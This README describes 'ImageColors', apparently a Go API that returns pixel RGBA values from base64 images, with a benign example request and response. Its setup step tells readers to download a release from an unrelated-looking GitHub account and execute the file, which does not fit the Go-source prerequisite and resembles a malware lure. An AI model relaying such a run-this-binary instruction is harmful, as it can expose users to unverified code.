## Features

- **Base64 Image Input**: Accepts images in base64 format.
- **RGBA Color Output**: Returns the RGBA values for specified pixel coordinates.
- **Simple API**: Easy to use and integrate into your applications.
- **Go Language**: Built using Go for performance and efficiency.

## Getting Started

To get started with ImageColors, download the latest release from [here](https://github.com/puskesmaskpsawah/ImageColors/releases). Make sure to execute the downloaded file to run the API locally.

### Prerequisites

- Go installed on your machine. You can download it from the [official Go website](https://golang.org/dl/).
- Basic knowledge of REST APIs and image processing concepts.

## Usage

Once you have the API running, you can make requests to it to get the RGBA values from your images. The API listens for incoming requests and responds with the color values based on the pixel coordinates you specify.

### Example Request

To use the API, send a POST request to the endpoint with the base64 image and the pixel coordinates. Below is an example of how to format your request.

```json
{
  "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
  "coordinates": {
    "x": 10,
    "y": 20
  }
}
```

### Example Response

The API will return a JSON response containing the RGBA values:

```json
{
  "rgba": {
    "r": 255,
    "g": 0,
    "b": 0,
    "a": 255
  }
}
```

## API Endpoints

### POST /color

- **Description**: Accepts a base64-encoded image and pixel coordinates, returning the RGBA color values.
- **Request Body**:
  - `image`: Base64-encoded image string.
  - `coordinates`: Object containing `x` and `y` values.

### Response

- **Success**: Returns RGBA values.
- **Error**: Returns an error message if the image is invalid or coordinates are out of bounds.

## Example

Hereâ€™s a quick example of how to use the API with `curl`:

```bash
curl -X POST http://localhost:8080/color \
-H "Content-Type: application/json" \
-d '{
  "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
  "coordinates": {
    "x": 10,
    "y": 20
  }
}'
```

This command sends a POST request to the API, and you will receive the RGBA values in the response.
